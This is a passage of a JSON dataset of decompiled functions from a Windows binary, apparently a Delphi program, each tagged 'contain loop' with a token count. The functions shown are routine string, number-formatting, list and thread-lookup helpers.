        "decompiled_code": "\nint32_t __fastcall fcn.00405bf8(uint param_1, uchar *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    iVar3 = 0;\n    if (param_2 != NULL) {\n        iVar3 = *(param_2 + -4);\n    }\n    iVar2 = fcn.00404020();\n    if ((*(iVar2 + 4) == -0x284e) || (cVar1 = fcn.00403f88(iVar3, param_2),  cVar1 != '\\0')) {\n        while( true ) {\n            puVar5 = *(iVar2 + 0x14) + *(iVar2 + 0xc);\n            iVar4 = *(iVar2 + 8) - *(iVar2 + 0xc);\n            if (iVar3 < iVar4) break;\n            *(iVar2 + 0xc) = *(iVar2 + 0xc) + iVar4;\n            iVar3 = iVar3 - iVar4;\n            for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *param_2;\n                param_2 = param_2 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            iVar4 = (**(iVar2 + 0x1c))();\n            if (iVar4 != 0) {\n                fcn.0040306c();\n                return iVar2;\n            }\n        }\n        *(iVar2 + 0xc) = *(iVar2 + 0xc) + iVar3;\n        for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *param_2;\n            param_2 = param_2 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 427
    },
    "00405fcc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00405fcc(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 1;\n    cVar1 = *param_2;\n    if ((cVar1 != '\\n') && (cVar1 != '\\v')) {\n        if (cVar1 == '\\f') {\n            do {\n                *in_EAX = 0;\n                in_EAX[1] = 0;\n                in_EAX[2] = 0;\n                in_EAX[3] = 0;\n                in_EAX = in_EAX + 4;\n                iVar4 = iVar3 + -1;\n                bVar2 = 0 < iVar3;\n                iVar3 = iVar4;\n            } while (iVar4 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\r') {\n            do {\n                fcn.00405f38();\n                iVar4 = iVar3 + -1;\n                bVar2 = 0 < iVar3;\n                iVar3 = iVar4;\n            } while (iVar4 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\x0e') {\n            do {\n                fcn.00405f08();\n                iVar4 = iVar3 + -1;\n                bVar2 = 0 < iVar3;\n                iVar3 = iVar4;\n            } while (iVar4 != 0 && bVar2);\n            return;\n        }\n        if ((cVar1 != '\\x0f') && (cVar1 != '\\x11')) {\n            if (*0x4a6008 != NULL) {\n                (**0x4a6008)();\n            }\n            fcn.00402fe8();\n            return;\n        }\n    }\n    do {\n        *in_EAX = 0;\n        in_EAX = in_EAX + 1;\n        iVar4 = iVar3 + -1;\n        bVar2 = 0 < iVar3;\n        iVar3 = iVar4;\n    } while (iVar4 != 0 && bVar2);\n    return;\n}\n",
        "token_count": 498
    },
    "00406110": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n// WARNING: Removing unreachable block (ram,0x00406092)\n// WARNING: Removing unreachable block (ram,0x00406078)\n\nvoid __fastcall fcn.00406110(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 1;\n    cVar1 = *param_2;\n    if (cVar1 == '\\n') {\n        fcn.0040546c();\n    }\n    else if (cVar1 == '\\v') {\n        fcn.00405c48();\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.0040600c();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.00406024();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\x0e') {\n        do {\n            fcn.00405fd8();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.00406f3c();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x4a6008 != NULL) {\n                (**0x4a6008)();\n            }\n            fcn.00402fe8();\n            return;\n        }\n        do {\n            fcn.00406864();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    return;\n}\n",
        "token_count": 544
    },
    "004066bc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.004066bc(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.0040546c();\n            }\n            else {\n                fcn.00405490();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00405c48();\n            }\n            else {\n                fcn.00405c60();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.0040600c();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.00406024();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.00405fd8();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.00406f3c();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x4a6008 != NULL) {\n                    (**0x4a6008)();\n                }\n                fcn.00402fe8();\n                return;\n            }\n            do {\n                fcn.00406864();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 583
    },
    "00406940": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00406940(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    piVar2 = *0x4a1038;\n    if (*0x4a1038 != NULL) {\n        do {\n            if (((in_EAX == piVar2[1]) || (in_EAX == piVar2[2])) || (in_EAX == piVar2[3])) {\n                iVar1 = fcn.004068f8();\n                return iVar1;\n            }\n            piVar2 = *piVar2;\n        } while (piVar2 != NULL);\n    }\n    return in_EAX;\n}\n",
        "token_count": 153
    },
    "00406978": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.00406978(void)\n\n{\n    char *in_EAX;\n    \n    while ((*in_EAX != '\\0' && (*in_EAX != '\\\\'))) {\n        in_EAX = sub.user32.dll_CharNextA();\n    }\n    return in_EAX;\n}\n",
        "token_count": 61
    },
    "00406dfc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00406dfc(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    \n    if ((*0x4a103c == NULL) || ((*0x4a103c)[1] != in_EAX)) {\n        ppiVar2 = *0x4a103c;\n        if (*0x4a103c != NULL) {\n            do {\n                ppiVar1 = *ppiVar2;\n                if ((ppiVar1 != NULL) && (ppiVar1[1] == in_EAX)) {\n                    *ppiVar2 = *ppiVar1;\n                    fcn.00402f0c();\n                    return;\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n    }\n    else {\n        *0x4a103c = **0x4a103c;\n        fcn.00402f0c();\n    }\n    return;\n}\n",
        "token_count": 220
    },
    "00406ecc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00406ecc(void)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint *var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    uStack16 = 0x406f30;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    var_4h = in_EAX;\n    fcn.00406e60();\n    *in_FS_OFFSET = uStack20;\n    puVar1 = *0x4a1038;\n    if (var_4h == *0x4a1038) {\n        *0x4a1038 = *var_4h;\n    }\n    else {\n        for (; puVar1 != NULL; puVar1 = *puVar1) {\n            if (*puVar1 == var_4h) {\n                *puVar1 = *var_4h;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "00409acc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409acc(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00405de8();\n    for (iVar2 = 1; (iVar2 <= iVar1 && (*(in_EAX + -2 + iVar2 * 2) < 0x21)); iVar2 = iVar2 + 1) {\n    }\n    if (iVar1 < iVar2) {\n        fcn.00405c48();\n    }\n    else {\n        for (; *(in_EAX + -2 + iVar1 * 2) < 0x21; iVar1 = iVar1 + -1) {\n        }\n        fcn.00405e78(param_2);\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "00409c20": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409c20(uint32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar5;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar6;\n    char cVar4;\n    \n    puVar6 = unaff_ESI;\n    if (param_1 == '\\0') {\n        if (in_EAX < 0) {\n            fcn.00409c36();\n            unaff_ESI[-1] = 0x2d;\n            return;\n        }\n        param_1 = 10;\n    }\n    do {\n        uVar2 = in_EAX / param_1;\n        puVar6 = puVar6 + -1;\n        cVar4 = in_EAX % param_1;\n        uVar3 = cVar4 + 0x30;\n        if (0x39 < uVar3) {\n            uVar3 = cVar4 + 0x37;\n        }\n        *puVar6 = uVar3;\n        in_EAX = uVar2;\n    } while (uVar2 != 0);\n    iVar5 = param_2 - (unaff_ESI - puVar6);\n    if (unaff_ESI - puVar6 <= param_2 && iVar5 != 0) {\n        iVar1 = -iVar5;\n        while (iVar5 = iVar5 + -1,  iVar5 != 0) {\n            (puVar6 + iVar1)[iVar5] = 0x30;\n        }\n        puVar6[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 382
    },
    "0040a8f8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a8f8(int32_t param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar4 = 0;\n    iVar6 = param_1;\n    pcVar7 = param_2;\n    if (param_1 != 0) {\n        do {\n            if (iVar6 == 0) break;\n            iVar6 = iVar6 + -1;\n            cVar2 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar2 != '\\0');\n        param_1 = param_1 - iVar6;\n        bVar8 = true;\ncode_r0x0040a911:\n        do {\n            if (param_1 != 0) {\n                param_1 = param_1 + -1;\n                pcVar1 = param_2 + 1;\n                pcVar7 = in_EAX + 1;\n                bVar8 = *in_EAX == *param_2;\n                in_EAX = pcVar7;\n                param_2 = pcVar1;\n                if (bVar8) goto code_r0x0040a911;\n            }\n            if (bVar8) {\n                return;\n            }\n            uVar3 = in_EAX[-1];\n            uVar5 = uVar4 & 0xffffff00 | uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar5 = uVar4 & 0xffffff00 | uVar3 - 0x20;\n            }\n            uVar3 = param_2[-1];\n            uVar4 = uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar4 = uVar3 - 0x20;\n            }\n            uVar4 = uVar5 - uVar4;\n            bVar8 = uVar4 == 0;\n        } while (bVar8);\n    }\n    return;\n}\n",
        "token_count": 505
    },
    "0040a93c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.0040a93c(uint param_1, char param_2)\n\n{\n    char *in_EAX;\n    \n    while( true ) {\n        if (param_2 == *in_EAX) {\n            return in_EAX;\n        }\n        if (*in_EAX == '\\0') break;\n        in_EAX = in_EAX + 1;\n    }\n    return NULL;\n}\n",
        "token_count": 90
    },
    "0040a950": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.0040a950(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    bool bVar9;\n    \n    if ((in_EAX != NULL) && (param_2 != NULL)) {\n        uVar2 = 0xffffffff;\n        pcVar7 = param_2;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar2 - 1;\n        if (uVar3 != 0) {\n            uVar4 = 0xffffffff;\n            pcVar7 = in_EAX;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                cVar1 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar1 != '\\0');\n            iVar5 = ~uVar4 - uVar3;\n            bVar9 = iVar5 == 0;\n            if (uVar3 <= ~uVar4 && !bVar9) {\n                do {\n                    pcVar7 = param_2 + 1;\n                    pcVar8 = in_EAX;\n                    do {\n                        in_EAX = pcVar8;\n                        if (iVar5 == 0) break;\n                        iVar5 = iVar5 + -1;\n                        in_EAX = pcVar8 + 1;\n                        bVar9 = *param_2 == *pcVar8;\n                        pcVar8 = in_EAX;\n                    } while (!bVar9);\n                    iVar6 = ~uVar2 - 2;\n                    pcVar8 = in_EAX;\n                    if (!bVar9) {\n                        return NULL;\n                    }\n                    do {\n                        if (iVar6 == 0) break;\n                        bVar9 = *pcVar7 == *pcVar8;\n                        iVar6 = iVar6 + -1;\n                        pcVar8 = pcVar8 + 1;\n                        pcVar7 = pcVar7 + 1;\n                    } while (bVar9);\n                    if (bVar9) {\n                        return in_EAX + -1;\n                    }\n                } while( true );\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 579
    },
    "0040abc6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040abc6(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *puVar3;\n    char cVar4;\n    int16_t iVar6;\n    uint32_t uVar7;\n    uint extraout_ECX;\n    unkbyte3 Var8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t unaff_EBP;\n    uint8_t *puVar11;\n    float10 fVar12;\n    float10 fVar13;\n    float10 fVar14;\n    uint var_69h;\n    uint var_59h;\n    uint var_49h;\n    uint var_28h;\n    uint var_24h;\n    uint var_18h;\n    uint var_ch;\n    uint var_4h;\n    char cVar5;\n    \n    iVar9 = *(unaff_EBP + -0xc);\n    if (iVar9 <= *(unaff_EBP + 8)) {\n        *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n    // WARNING: Could not recover jumptable at 0x0040abe6. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x40abed\n        (**(*(*(unaff_EBP + 0xc) + iVar9 * 8 + 4) * 4 + 0x40abed))();\n        return;\n    }\n    do {\n        fcn.0040adf3();\n        puVar3 = fcn.0040aa14();\n        uVar10 = *(unaff_EBP + -0x24);\n        if (0x20 < uVar10) {\n            uVar10 = 0;\n        }\n        cVar5 = extraout_ECX;\n        Var8 = extraout_ECX >> 8;\n        cVar4 = cVar5 + -0x44;\n        if (cVar4 == '\\0') break;\n        cVar4 = '\\x10';\n        Var8 = 0;\n        if (cVar5 == 'X') break;\n        cVar4 = '\\n';\n        Var8 = 0;\n    } while (cVar5 != 'U');\n    iVar6 = CONCAT31(Var8, cVar4);\n    if ((cVar4 == '\\0') && (iVar6 = 10,  (*(puVar3 + 4) & 0x80000000) != 0)) {\n        fcn.00409cc0(-*puVar3, -(*(puVar3 + 4) + (*puVar3 != 0)));\n        *(unaff_EBP + -0x4a) = 0x2d;\n        return;\n    }\n    if ((*(puVar3 + 4) & 0x80000000) == 0) {\n        fVar14 = *puVar3;\n    }\n    else {\n        fVar14 = 0x7fffffffffffffff + 1 + (*puVar3 & 0x7fffffffffffffff);\n    }\n    fVar12 = iVar6;\n    puVar11 = unaff_EBP + -0x49;\n    do {\n        puVar11 = puVar11 + -1;\n        fVar13 = fVar14 - (fVar14 / fVar12) * fVar12;\n        fVar14 = fVar14 / fVar12;\n        var_4h._0_1_ = ROUND(fVar13);\n        uVar2 = var_4h + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = var_4h + 0x37;\n        }\n        *puVar11 = uVar2;\n    } while (1 <= fVar14);\n    uVar7 = (unaff_EBP + -0x49) - puVar11;\n    iVar9 = uVar10 - uVar7;\n    if (uVar7 <= uVar10 && iVar9 != 0) {\n        iVar1 = -iVar9;\n        while (iVar9 = iVar9 + -1,  iVar9 != 0) {\n            (puVar11 + iVar1)[iVar9] = 0x30;\n        }\n        puVar11[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 984
    },
    "0040b57f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040b57f(void)\n\n{\n    char cVar1;\n    char *unaff_ESI;\n    \n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 == '\\0') {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n    } while (cVar1 == ' ');\n    return;\n}\n",
        "token_count": 86
    },
    "0040c850": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c850(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *param_2;\n    while( true ) {\n        iVar1 = fcn.0040572c();\n        if ((iVar1 < iVar2) || (*(in_EAX + -1 + iVar2) != ' ')) break;\n        iVar2 = iVar2 + 1;\n    }\n    *param_2 = iVar2;\n    return;\n}\n",
        "token_count": 127
    },
    "0040ca1c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040ca1c(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 1;\n    while( true ) {\n        iVar2 = fcn.0040572c();\n        if (iVar2 < iVar3) {\n            return 0;\n        }\n        uVar1 = *(in_EAX + -1 + iVar3) & 0xdf;\n        if (uVar1 == 0x44) {\n            return 1;\n        }\n        if (uVar1 == 0x45) {\n            return 2;\n        }\n        if (uVar1 == 0x4d) break;\n        if (uVar1 == 0x59) {\n            return 2;\n        }\n        iVar3 = iVar3 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 200
    },
    "0040e934": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e934(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = fcn.0040e968();\n    iVar3 = iVar2;\n    if (param_2 != '\\0') {\n        while (iVar1 = iVar3,  iVar1 != 0) {\n            iVar3 = fcn.0040e968();\n            iVar2 = iVar1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 122
    },
    "0040e968": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040e968(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.0040a93c();\n    while ((iVar2 != 0 && (cVar1 = fcn.0040e424(),  cVar1 != '\\0'))) {\n        iVar2 = fcn.0040a93c();\n    }\n    return iVar2;\n}\n",
        "token_count": 93
    },
    "0040f21c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar fcn.0040f21c(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    cVar1 = '\\x01';\n    for (puVar2 = *0x4a1a28; (cVar1 != '\\0' && (puVar2 != NULL)); puVar2 = *puVar2) {\n        cVar1 = (*puVar2[1])();\n    }\n    return cVar1;\n}\n",
        "token_count": 100
    },
    "0040f4a0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f4a0(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    uVar1 = fcn.0040f484();\n    iVar2 = sub.kernel32.dll_GetCurrentThreadId_1();\n    for (puVar3 = *(in_EAX + 4 + (uVar1 & 0xff) * 4); (puVar3 != NULL && (iVar2 != puVar3[1])); puVar3 = *puVar3) {\n    }\n    if (puVar3 == NULL) {\n        puVar3 = fcn.0040f528();\n        if (puVar3 == NULL) {\n            puVar3 = fcn.00402ed8();\n            puVar3[1] = iVar2;\n            puVar3[2] = 0x7fffffff;\n            *puVar3 = puVar3;\n            uVar4 = fcn.0040f41c();\n            *puVar3 = uVar4;\n        }\n    }\n    *param_2 = puVar3;\n    return;\n}\n",
        "token_count": 269
    },
    "0040f528": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * fcn.0040f528(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar2 = fcn.0040f484();\n    puVar1 = *(in_EAX + 4 + (uVar2 & 0xff) * 4);\n    while( true ) {\n        if (puVar1 == NULL) {\n            return NULL;\n        }\n        iVar3 = fcn.0040f41c();\n        if (iVar3 != 0x7fffffff) break;\n        puVar1 = *puVar1;\n    }\n    uVar4 = sub.kernel32.dll_GetCurrentThreadId_1();\n    puVar1[1] = uVar4;\n    return puVar1;\n}\n",
        "token_count": 184
    },
    "00410e1c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410e1c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x411061;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00410e1c::var_18h;\n    if (in_EAX < -0x7ffdfff5) {\n        if (in_EAX == -0x7ffdfff6) {\n            var_1ch = 0x410ef2;\n            var_10h = &stack0xfffffffc;\n            fcn.00407480();\n            var_1ch = 0x410f01;\n            fcn.0040d9f8();\n            var_1ch = 0x410f06;\n            fcn.00404eb4();\n            goto code_r0x00411039;\n        }\n        if (in_EAX < -0x7ffdfffa) {\n            if (in_EAX == -0x7ffdfffb) {\n                var_1ch = 0x410eb0;\n                var_10h = &stack0xfffffffc;\n                fcn.00410be8();\n                goto code_r0x00411039;\n            }\n            if (in_EAX == -0x7fffbfff) {\n                var_1ch = 0x410f64;\n                var_10h = &stack0xfffffffc;\n                fcn.00407480();\n                var_1ch = 0x410f73;\n                fcn.0040d9f8();\n                var_1ch = 0x410f78;\n                fcn.00404eb4();\n                goto code_r0x00411039;\n            }\n            if (in_EAX == -0x7fff0001) {\n                var_1ch = 0x410fd3;\n                var_10h = &stack0xfffffffc;\n                fcn.00407480();\n                var_1ch = 0x410fe2;\n                fcn.0040d9f8();\n                var_1ch = 0x410fe7;\n                fcn.00404eb4();\n                goto code_r0x00411039;\n            }\n        }\n        else {\n            if (in_EAX == -0x7ffdfff8) {\n                var_1ch = 0x410ec2;\n                var_10h = &stack0xfffffffc;\n                fcn.00407480();\n                var_1ch = 0x410ed1;\n                fcn.0040d9f8();\n                var_1ch = 0x410ed6;\n                fcn.00404eb4();\n                goto code_r0x00411039;\n            }\n            if (in_EAX == -0x7ffdfff7) {\n                var_1ch = 0x410ee0;\n                var_10h = &stack0xfffffffc;\n                fcn.00410cd8();\n                goto code_r0x00411039;\n            }\n        }\n    }\n    else {\n        if (in_EAX == -0x7ffdfff5) {\n            var_1ch = 0x410f18;\n            fcn.00407480();\n            var_1ch = 0x410f27;\n            fcn.0040d9f8();\n            var_1ch = 0x410f2c;\n            fcn.00404eb4();\n            goto code_r0x00411039;\n        }\n        if (in_EAX == -0x7ffdfff3) {\n            var_1ch = 0x410f3e;\n            var_10h = &stack0xfffffffc;\n            fcn.00407480();\n            var_1ch = 0x410f4d;\n            fcn.0040d9f8();\n            var_1ch = 0x410f52;\n            fcn.00404eb4();\n            goto code_r0x00411039;\n        }\n        if (in_EAX == -0x7ff8fff2) {\n            var_1ch = 0x410f8a;\n            var_10h = &stack0xfffffffc;\n            fcn.00407480();\n            var_1ch = 0x410f99;\n            fcn.0040d9f8();\n            var_1ch = 0x410f9e;\n            fcn.00404eb4();\n            goto code_r0x00411039;\n        }\n        if (in_EAX == -0x7ff8ffa9) {\n            var_1ch = 0x410fb0;\n            var_10h = &stack0xfffffffc;\n            fcn.00407480();\n            var_1ch = 0x410fbf;\n            fcn.0040d9f8();\n            var_1ch = 0x410fc4;\n            fcn.00404eb4();\n            goto code_r0x00411039;\n        }\n    }\n    var_38h = **0x4a50dc;\n    var_34h._0_1_ = 0xb;\n    var_2ch._0_1_ = 0;\n    var_1ch = 0x411008;\n    var_10h = &stack0xfffffffc;\n    fcn.0040d1e4();\n    var_1ch = &fcn.00410e1c::var_38h;\n    var_20h = 2;\n    var_24h = 0x411025;\n    fcn.00407480();\n    var_24h = 0x411034;\n    fcn.0040da34(var_20h, var_1ch);\n    var_24h = 0x411039;\n    fcn.00404eb4();\ncode_r0x00411039:\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x411068;\n    var_1ch = 0x411053;\n    fcn.00405490();\n    var_1ch = 0x411060;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1572
    },
    "004162c8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004162c8(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    \n    if (param_2 != 0) {\n        iVar2 = **(in_EAX + 0xb + *(in_EAX + 1));\n        uVar3 = *(iVar2 + 1);\n        puVar4 = iVar2 + 0xf + uVar3;\n        piVar1 = iVar2 + 7 + uVar3;\n        iVar2 = 0;\n        do {\n            uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            if (uVar3 == *(param_2 + -4)) {\n                while (((*((uVar3 - 1) + param_2) ^ puVar4[uVar3]) & 0xdf) == 0) {\n                    uVar3 = uVar3 - 1;\n                    if (uVar3 == 0) {\n                        return iVar2;\n                    }\n                }\n                uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            }\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + uVar3 + 1;\n        } while (iVar2 <= *piVar1);\n    }\n    return -1;\n}\n",
        "token_count": 322
    },
    "00416378": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416378(uint param_1, uchar *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t uVar4;\n    uchar *puVar3;\n    uchar *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    if (in_EAX != 0) {\n        puVar3 = param_2;\n        if (param_2 != NULL) {\n            puVar3 = CONCAT11(*param_2, param_2[-4]) & 0xdfff;\n        }\n        while( true ) {\n            iVar1 = in_EAX + 2 + *(in_EAX + 1);\n            uVar6 = *(iVar1 + 10);\n            uVar7 = *(iVar1 + 0xb + uVar6);\n            if (uVar7 != 0) {\n                iVar2 = iVar1 + 0xd + uVar6;\n                do {\n                    puVar5 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffffdfff;\n                    if (puVar5 == puVar3) {\n                        uVar6 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffff00ff;\n                        while( true ) {\n                            uVar4 = param_2[uVar6 - 